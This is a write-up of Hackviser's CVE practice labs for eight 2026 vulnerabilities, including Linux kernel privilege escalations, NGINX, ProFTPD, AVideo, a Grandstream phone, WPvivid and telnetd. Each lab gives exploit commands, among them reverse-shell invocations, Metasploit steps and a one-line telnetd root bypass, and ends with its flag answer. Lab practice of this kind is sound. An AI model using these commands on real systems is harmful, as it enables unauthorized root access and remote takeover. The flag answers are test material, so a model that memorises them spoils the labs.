---
title: 'CVE 2026'
date: '2026-05-04'
excerpt: 'CVE-2026-43284 & CVE-2026-43500, CVE-2026-42945, CVE-2026-31431, CVE-2026-42167, CVE-2026-29058, CVE-2026-2329, CVE-2026-1357, CVE-2026-24061'
prog: 'Hackviser CVE Labs  -  June 2026'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">CVE 2026</h1>
<div class="writeup-date">June 2026 · CVE Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>

<h4 class="mb-2"><strong>1. Dirty Frag – Linux Kernel Local Privilege Escalation (CVE-2026-43284 & CVE-2026-43500)</strong></h4>
<p class="mb-3">Dirty Frag is a Linux kernel local privilege escalation vulnerability chain that allows a low-privileged local user to gain root access by abusing page cache write behavior in kernel networking components.

This laboratory demonstrates the Dirty Frag vulnerability chain, tracked as CVE-2026-43284 and CVE-2026-43500. Dirty Frag belongs to the same bug class as Dirty Pipe and Copy Fail, but instead of targeting pipe buffers or the <code>algif_aead</code> interface directly, it abuses the frag member of <code>struct sk_buff</code> in Linux kernel networking paths.

The chain combines two page-cache write primitives: <code>xfrm-ESP</code> Page-Cache Write and <code>RxRPC</code> Page-Cache Write. By using zero-copy mechanisms such as <code>splice()</code>, an attacker can place a reference to a read-only file's page cache into a network packet buffer. The kernel then performs in-place crypto operations on that externally backed memory page. As a result, files that an unprivileged user can only read, such as <code>/usr/bin/su</code> or <code>/etc/passwd</code>, can be modified in RAM through the page cache without changing the original file on disk.

The highest CVSS score in this vulnerability chain is 8.8. In a successful exploitation scenario, a local attacker can temporarily modify the cached memory of a setuid-root binary and execute it to obtain a root shell.

Vulnerability Scope:
<br />
- CVE-2026-43284: Affects the <code>xfrm-ESP</code> path. According to the original Dirty Frag write-up, this issue is in scope from Linux kernel commit <code>cac2661c53f3</code> dated 2017-01-17 up to the mainline fix commit <code>f4c50a4034e6</code> dated 2026-05-05. <br />
- CVE-2026-43500: Affects the <code>RxRPC</code> path. According to the original Dirty Frag write-up, this issue is in scope from Linux kernel commit <code>2dc334f1a63a</code> dated 2023-06-08 up to the mainline fix commit <code>aa54b1d27fe0</code> dated 2026-05-10. <br />
- Affected Kernel Ranges: NVD lists vulnerable Linux kernel ranges for CVE-2026-43284 including 4.11 to before 5.10.255, 5.12 to before 5.15.205, 5.16 to before 6.1.171, 6.2 to before 6.6.138, 6.7 to before 6.12.87, 6.13 to before 6.18.28, and 7.0 to before 7.0.5. <br />
- RxRPC Affected Ranges: NVD lists vulnerable Linux kernel ranges for CVE-2026-43500 from after 5.3 to before 6.18.29, and from 6.19 to before 7.0.6, including early 7.1-rc releases. </p>
<p class="mb-3">
Using the low-privilege credentials, you must connect to the machine over SSH and escalate to root.
<br />
SSH username: <code>guest</code>
<br />
SSH password: <code>guest</code>
<br />
What is the secret inside the <code>/root/secret.txt</code> file?</p>
<p class="mb-3"><strong>Steps: </strong>First we need to SSH to the target machine with the credentials given. Then we enter <code>vi exp.c</code> and paste the payload from <a href="https://github.com/V4bel/dirtyfrag/blob/master/exp.c" rel="noopener noreferrer" target="_blank">this link containing the Dirty Frag exploit</a>. Then enter <code>gcc -O0 -Wall -o exp exp.c -lutil && ./exp</code> and an interactive shell will spawn. When we use <code>whoami</code>, we can see that we are currently the root user, and this allows us to read the secret in the target file.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-43284_cve-2026-43500/cvelabs_cve-2026-43284_cve-2026-43500_image1.png" alt="CVE-2026-43283 & CVE-2026-43500 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Oblivion</p>
<br />


<h4 class="mb-2">2. NGINX Rewrite Module RCE via Heap Buffer Overflow (CVE-2026-42945)</h4>
<p class="mb-3">NGINX is a widely used open-source web server, reverse proxy, load balancer, and HTTP cache commonly deployed in front of web applications and infrastructure services. This laboratory contains the CVE-2026-42945 vulnerability affecting NGINX Open Source and NGINX Plus under specific rewrite configuration conditions. The vulnerability is rated Critical with a CVSS score of 9.2. The flaw exists in the <code>ngx_http_rewrite_module</code> when a <code>rewrite</code> directive is followed by another <code>rewrite</code>, <code>if</code>, or <code>set</code> directive, uses an unnamed PCRE capture such as <code>$1</code> or <code>$2</code>, and includes a question mark (<code>?</code>) in the replacement string. An unauthenticated attacker can send crafted HTTP requests that trigger a heap buffer overflow in the NGINX worker process.

In normal environments, successful exploitation may cause the worker process to crash or restart, resulting in denial of service. In environments where ASLR is disabled or predictable, code execution may also be possible.</p>

<p class="mb-3">What is the secret in the <code>/secret.txt</code> file?</p>
<p class="mb-3"><strong>Steps: </strong>First we need to run <code>nmap -sC -sV -A -p- [target_IP]</code> to identify which ports the target's NGINX uses.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42945/cvelabs_cve-2026-42945_image1.png" alt="CVE-2026-42945 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Then we create a Python script file named <code>nginx-rift.py</code> and paste <a href="https://github.com/DepthFirstDisclosures/Nginx-Rift/blob/main/poc.py" target="_blank" rel="noopener noreferrer">DepthFirst's Nginx-Rift PoC exploit code from here</a>.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42945/cvelabs_cve-2026-42945_image2.png" alt="CVE-2026-42945 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Notice that when we run <code>python3 nginx-rift.py --host 172.20.5.12 --port 80 --listen-ip 172.20.5.198 --cmd [commands]</code>, we can see that our attempt crashed. To prevent this, we need to run the exploit not as a bind shell but as a reverse shell by using <code>python3 nginx-rift.py --host 172.20.5.12 --port 80 --listen-ip 172.20.5.198 --shell</code>. This will open an interactive shell allowing us to execute commands.</p>
<p class="mb-5"><strong>Answer:</strong> Harpocrates</p>
<br />


<h4 class="mb-2">3. Copy Fail – Linux Kernel Local Privilege Escalation (CVE-2026-31431)</h4>
<p class="mb-3">This laboratory demonstrates a high-severity vulnerability identified as Copy Fail (CVE-2026-31431). The flaw is a direct logic error in the Linux kernel's <code>algif_aead</code> interface, introduced in 2017 via commit <code>72548b093ee3</code>. The <code>authencesn</code> algorithm uses a 4-byte area as scratch space during processing; due to this vulnerability, these 4 bytes are written directly into the page cache (the in-memory copy) of the target file. By chaining <code>AF_ALG</code> sockets with the <code>splice()</code> system call, an unprivileged local user can trick the kernel into performing this 4-controlled-byte write into the read-only memory of setuid binaries (such as <code>/usr/bin/su</code>), gaining root access within seconds without modifying the physical file on disk.
<br />
Vulnerability Scope:
- Vulnerable: Linux kernel 4.14 through 7.0-rc (essentially all mainstream kernels compiled between 2017 and April 2026). This includes all 6.18.x versions prior to 6.18.22 and 6.19.x prior to 6.19.12.
- Fixed: Versions 7.0, 6.19.12, and 6.18.22.
- Downstream LTS Exposure: Older LTS lines such as 6.12.x, 6.6.x, 5.15.x, and 5.10.x remain vulnerable unless specifically patched after April 2026.</p>
<p class="mb-3">
Using the low-privilege credentials, you must connect to the machine over SSH and escalate to root. (Because the box has no internet access, exploit files cannot be downloaded from the web; instead, transfer them via a local HTTP server over HackerBox/VPN, or use copy-and-paste.)
<br />
SSH username: <code>guest</code>
<br />
SSH password: <code>guest</code>
<br />
What is the secret inside the <code>/root/secret.txt</code> file?
</p>
<p class="mb-3"><strong>Steps: </strong>Once we login via SSH with the given credentials, we create a Python script file named <code>copy-fail.py</code> and paste <a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py" target="_blank" rel="noopener noreferrer">Theori's Copy Fail PoC exploit code from here</a>. Then we run <code>python3 copy-fail.py</code> and we should now have our privileges escalated.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-31431/cvelabs_cve-2026-31431_image1.png" alt="CVE-2026-31431 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Lumos</p>
<br />


<h4 class="mb-2">4. ProFTPD Authentication Bypass & Remote Code Execution (CVE-2026-42167)</h4>
<p class="mb-3">ProFTPD is a highly configurable open-source FTP server.

In versions prior to 1.3.9 using the <code>mod_sql</code> module, a critical logical vulnerability (CVE-2026-42167) exists in the <code>is_escaped_text()</code> function. The flaw allows attackers to bypass SQL character escaping by providing inputs that start and end with a single quote. This can lead to unauthenticated authentication bypass or, when combined with a PostgreSQL backend, stacked query injection to achieve Remote Code Execution (RCE) via the <code>COPY FROM PROGRAM</code> directive.

Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>First we run <code>nmap -sC -sV -A [target_IP]</code> to see which port ProFTPD uses.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42167/cvelabs_cve-2026-42167_image1.png" alt="CVE-2026-42167 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3"> Then we run <code>vi exploit.py</code> and paste <a href="https://github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc/blob/main/pocs/preauth_user_rce.py" target="_blank" rel="noopener noreferrer">ZeroPathAI's PoC exploit code from here</a>.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42167/cvelabs_cve-2026-42167_image2.png" alt="CVE-2026-42167 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Next, we run <code>python3 exploit.py --host [target_IP] --port 2121 --shell-host [local_IP]</code> and a shell will appear, allowing us to execute commands.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42167/cvelabs_cve-2026-42167_image3.png" alt="CVE-2026-42167 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Jupiter</p>
<br />


<h4 class="mb-2">5. AVideo Encoder getImage.php Command Injection (CVE-2026-29058)</h4>
<p class="mb-3">AVideo is an open-source video-sharing platform solution.

In versions of AVideo Encoder prior to 7.0, there is an unauthenticated OS Command Injection vulnerability (CVE-2026-29058) caused by the improper sanitization of the <code>base64Url</code> GET parameter located in the <code>objects/getImage.php</code> endpoint. This vulnerability allows attackers to directly execute injected shell commands on the server.

Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2026-29058</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-29058/cvelabs_cve-2026-29058_image1.png" alt="CVE-2026-29058 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-29058/cvelabs_cve-2026-29058_image2.png" alt="CVE-2026-29058 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open and we use <code>shell</code> to execute commands to read <code>/secret.txt</code>.</p>
<p class="mb-5"><strong>Answer:</strong> Pandora</p>
<br />


<h4 class="mb-2">6. Grandstream GXP1600 Unauthenticated Remote Code Execution (CVE-2026-2329)</h4>
<p class="mb-3">The Grandstream GXP1600 series is a widely used VoIP (Voice over IP) desktop phone solution designed for businesses and small offices to handle voice communications.

The web management interface of these devices contains a critical stack-based buffer overflow vulnerability in the <code>/cgi-bin/api.values.get</code> endpoint that does not require authentication. Attackers can exploit this vulnerability to execute arbitrary code remotely (RCE) with root privileges on the device.

Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the hidden information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2026-2329</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-2329/cvelabs_cve-2026-2329_image1.png" alt="CVE-2026-2329 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we use <code>shell</code> to execute commands to read the file contents.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-2329/cvelabs_cve-2026-2329_image2.png" alt="CVE-2026-2329 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Europa</p>
<br />


<h4 class="mb-2">7. WPvivid Backup & Migration Plugin Unauthenticated Remote Code Execution (CVE-2026-1357)</h4>
<p class="mb-3">WPvivid Backup & Migration is a popular WordPress plugin used for backups, restorations, and site migrations.

This laboratory covers a critical vulnerability found in versions <= 0.9.123. The issue resides in the "Auto-Migration" functionality, which fails to properly validate incoming requests when the migration endpoint is active. Unauthenticated attackers can bypass authentication, use path traversal to upload arbitrary PHP files, and execute system commands.

Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside?</p>
<p class="mb-3"><strong>Steps: </strong>First we run <code>vi cve-2026-1357-exploit.py</code> and paste <a href="https://github.com/halilkirazkaya/CVE-2026-1357/blob/main/exploit.py" target="_blank" rel="noopener noreferrer">halilkirazkaya's PoC exploit code from here</a>. Then we run <code>python3 cve-2026-1357-exploit.py -u http://target_IP -s "cat /secret.txt"</code>.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-1357/cvelabs_cve-2026-1357_image1.png" alt="CVE-2026-1357 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Aether</p>
<br />


<h4 class="mb-2">8. GNU Inetutils Telnetd Authentication Bypass (CVE-2026-24061)</h4>
<p class="mb-3">GNU Inetutils <code>telnetd</code> is a widely used daemon that provides remote command-line access.

This laboratory contains the CVE-2026-24061 vulnerability, affecting GNU Inetutils versions prior to 2.4. This is a critical Argument Injection flaw. The daemon improperly passes the <code>USER</code> environment variable (supplied by the client) to the <code>/bin/login</code> binary without sanitization.

To exploit this, we manipulate the <code>USER</code> variable to inject arguments:

- <code>-f root</code> (Force Flag): This injected payload is passed to <code>/bin/login</code>. It instructs the system to force the login for the "root" user, effectively bypassing the authentication (password) check completely.
- <code>-a</code> (Auto Login): This flag forces the telnet client to send the local environment variables (including our malicious <code>USER</code> variable) to the server during the initial handshake.
Run the following command in your terminal:
</p>

```bash
USER='-f root' telnet -a <TARGET_IP>
```

<p class="mb-3">Exploit the vulnerability to gain root access. Read the <code>/secret.txt</code> file. What is the secret content?</p>
<p class="mb-3"><strong>Steps: </strong>Using the command <code>USER='-f root' telnet -a [TARGET_IP]</code> directly makes us root user on the target machine, which allows us to read the file.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-24061/cvelabs_cve-2026-24061_image1.png" alt="CVE-2026-24061 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Poseidon</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">June 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>